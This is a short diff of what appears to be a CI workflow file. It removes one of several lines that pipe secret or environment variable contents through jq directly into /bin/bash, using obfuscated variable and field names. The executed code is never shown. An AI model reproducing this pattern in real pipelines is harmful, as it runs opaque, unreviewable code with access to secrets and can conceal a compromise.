@@ -21,7 +21,6 @@ jobs:
           abcuv29: ${{ secrets.abcuv29 }}
         run: |
           printf '%s' "$abcuv29" | jq -r .gf708 | /bin/bash
-          echo $p873 | jq -r .o9 | /bin/bash
           printf '%s' "$czc723" | jq -r .iohz77914 | /bin/bash
           echo $nif04877 | jq -r .utxtu69 | /bin/bash
           echo $qwwp22656 | jq -r .zug41 | /bin/bash
